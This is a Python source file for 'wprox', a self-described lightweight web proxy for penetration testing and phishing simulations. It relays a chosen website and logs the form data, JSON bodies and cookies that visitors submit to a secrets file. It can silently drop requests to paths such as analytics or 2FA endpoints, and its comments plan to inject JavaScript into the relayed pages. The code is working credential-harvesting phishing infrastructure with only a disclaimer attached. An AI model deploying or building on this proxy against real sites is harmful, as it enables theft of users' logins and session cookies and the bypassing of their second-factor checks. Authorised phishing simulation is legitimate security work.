import argparse
from bs4 import BeautifulSoup
import requests
import cgi
import urllib.parse as urlparse
import json
import logging

from flask import Flask
from flask import request
import waitress
from waitress import task

# ref: https://stackoverflow.com/questions/287871/how-do-i-print-colored-text-to-the-terminal
class TermColor:
  HEADER = '\033[95m'
  OKBLUE = '\033[94m'
  OKCYAN = '\033[96m'
  OKGREEN = '\033[92m'
  WARNING = '\033[93m'
  FAIL = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'

"""
Create a proxy for a host and port combination.
"""
def make_proxy(target_host, target_proto, breakpoints=[], secrets_file='secrets.log', traffic_file='traffic.log', quiet=False):
  formatter = logging.Formatter(fmt='%(asctime)s %(levelname)-8s %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
  stdout_formatter = logging.Formatter(fmt=f'{TermColor.BOLD}%(asctime)s %(levelname)s{TermColor.ENDC} %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
  channel = logging.StreamHandler()
  channel.setFormatter(stdout_formatter)

  secret_logger = logging.getLogger('secrets')
  secret_logger.setLevel(logging.INFO)
  secret_logger.propagate = False
  if secrets_file != 'off':
    fh = logging.FileHandler(secrets_file)
    fh.setLevel(logging.INFO)
    fh.setFormatter(formatter)
    secret_logger.addHandler(fh)

  if not quiet:
    secret_logger.addHandler(channel)

  traffic_logger = logging.getLogger('traffic')
  traffic_logger.setLevel(logging.INFO)
  traffic_logger.propagate = False
  if traffic_file != 'off':
    fh = logging.FileHandler(traffic_file)
    fh.setLevel(logging.INFO)
    fh.setFormatter(formatter)
    traffic_logger.addHandler(fh)

  traffic_logger.addHandler(channel)

  app = Flask(__name__, static_folder=None)

  HTTP_METHODS = ['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH']

  # Wildcard handler
  @app.route('/', defaults={'path': ''}, methods=HTTP_METHODS)
  @app.route('/<path:path>', methods=HTTP_METHODS)
  def handle_all_requests(path):
      if path.startswith('/'):
        path = path[1:]
      modified_headers = {}

      # Modify headers from client
      for (header, value) in request.headers:
        lower_header = header.lower()

        # Remove host header and set to correct value (client sent our hostname here)
        if lower_header == 'host':
          modified_headers[header] = target_host
        else:
          modified_headers[header] = value

      # read body data
      raw_in = request.get_data()

      # if content type is "interesting", log it:
      if 'Content-Type' in modified_headers:
        mimetype, options = cgi.parse_header(modified_headers['Content-Type'])
        in_decoded = raw_in.decode(options.get('encoding', 'utf8'))  # if no encoding, assume utf8
        if mimetype == 'application/x-www-form-urlencoded':
          secret_logger.info('capture(%s): %s: form: %s', request.remote_addr, path, urlparse.parse_qs(in_decoded))
        elif mimetype == 'application/json':
          secret_logger.info('capture(%s): %s: json: %s', request.remote_addr, path, json.loads(in_decoded))

      # if they've sent cookies, log them.
      if 'Cookie' in modified_headers:
        secret_logger.info('cookie(%s): %s', request.remote_addr, modified_headers['Cookie'])

      if breakpoints and '/%s' % path in breakpoints:
        traffic_logger.info('proxy(%s): BREAKPOINT: %s %s/%s', request.remote_addr, request.method, target_host, path)
        return b'', 200, {}

      # log proxy request
      traffic_logger.info('proxy(%s): %s %s/%s', request.remote_addr, request.method, target_host, path)

      # make request object to send to upstream
      esreq = requests.Request(
        method=request.method,
        url='%s://%s/%s' % (target_proto, target_host, path),
        headers=modified_headers,
        params=request.args,
        data=raw_in
      )

      # send to upstream
      resp = requests.Session().send(
        esreq.prepare(),
        stream=True,
        allow_redirects=False # don't want to be smart - breaks web functionality
      )

      # modify headers, remove any ones we don't need.
      # Use waitress's list of hop-by-hop headers
      out_headers = {}
      for (h, hv) in resp.headers.items():
        if h.lower() in task.hop_by_hop:
          pass  # if considered to be "hop-by-hop", drop it.
        else:
          out_headers[h] = hv

      # tell browser not to cache this.
      out_headers['Cache-Control'] = 'no-cache'

      # Read raw data
      res_data = resp.raw.read()

      # Potentially modify contents
      if 'Content-Type' in out_headers:
        mimetype, options = cgi.parse_header(out_headers['Content-Type'])

        # if HTML, parse and modify
        if mimetype == 'text/html':
          soup = BeautifulSoup(res_data, 'html.parser')

          # TODO: do modifications here.
          # potentially:
          # - alter form posts to third party origins to proxy our site
          # - implement a link proxy so outbound traffic can be logged
          # - inject javascript to modify application

          res_data = str(soup).encode(options.get('charset', 'utf8'))

      return res_data, resp.status_code, out_headers
  return app

# MAIN routine
if __name__ == '__main__':
    print(f"""{TermColor.OKGREEN}
 __  __  __  _____   _ __   ___   __  _
/\ \/\ \/\ \/\ '__`\/\`'__\/ __`\/\ \/'\\
\ \ \_/ \_/ \ \ \L\ \ \ \//\ \L\ \/>  </
 \ \___x___/'\ \ ,__/\ \_\\ \____//\_/\_\\
  \/__//__/   \ \ \/  \/_/ \/___/ \//\/_/
               \ \_\\
                \/_/
{TermColor.ENDC}
a lightweight web proxy for penetration testing, phishing simulations.

DISCLAIMER: This is {TermColor.UNDERLINE}only{TermColor.ENDC} for testing or research purposes,
where permission from upstream site owners has been given.

{TermColor.BOLD}{TermColor.WARNING}Do not use this tool for illegal purposes!{TermColor.ENDC}\n""")
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', help='The host to proxy.')
    parser.add_argument('--proto', help='protocol to use (http/https).', default='https')
    parser.add_argument('--bind_ip', help='Bind IP address', default='0.0.0.0')
    parser.add_argument('--bind_port', help='Bind Port', default=2600, type=int)
    parser.add_argument('--num-threads', help='Number of threads for request serving', default=8, type=int)
    parser.add_argument('--dev-mode', help='Use flask dev server (not recommended)', action='store_true')
    parser.add_argument('--debug', help='Print some extra debug info', action='store_true')
    parser.add_argument('--break', dest='breakpoints', help='"break" drop requests to a specific path on this server, like analytics, logging, 2fa.', nargs='+')
    parser.add_argument('--secrets-log', help='Logfile to write secrets to', default='secrets.log')
    parser.add_argument('--traffic-log', help='Logfile to write traffic logs to', default='traffic.log')
    parser.add_argument('--trusted-proxy', help='When running behind a reverse-proxy, trust it to pass headers containing forwarded info', default=None)
    parser.add_argument('--quiet', help='Hide messages about credentials and just display traffic logs in STDOUT', action='store_true')

    # parse args
    args = parser.parse_args()

    if args.debug:
      print(args)

    # create a proxy for this host/protocol
    app = make_proxy(args.host, args.proto, breakpoints=args.breakpoints, secrets_file=args.secrets_log, traffic_file=args.traffic_log, quiet=args.quiet)

    # start the server
    if args.dev_mode:
      # Dev-mode flask server.
      app.run(host=args.bind_ip, port=args.bind_port)
    else:
      # Production quality WSGI server.
      print(f'starting wprox on {args.bind_ip}:{args.bind_port}...')
      waitress.serve(app, host=args.bind_ip, port=args.bind_port, threads=args.num_threads, trusted_proxy=args.trusted_proxy or None)